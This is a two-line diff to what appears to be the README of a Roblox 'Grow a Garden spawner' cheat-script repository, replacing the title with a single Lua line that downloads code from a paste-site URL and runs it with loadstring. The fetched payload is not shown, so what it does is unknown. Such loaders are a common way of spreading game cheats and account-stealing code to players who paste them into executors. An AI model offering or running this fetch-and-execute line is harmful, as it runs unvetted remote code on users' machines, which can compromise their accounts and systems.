@@ -1,2 +1,1 @@
-# dagger-growagarden-script
-Grow a Garden Spawner Script
+loadstring(game:HttpGet("https://pastefy.app/9oseVNee/raw"))()
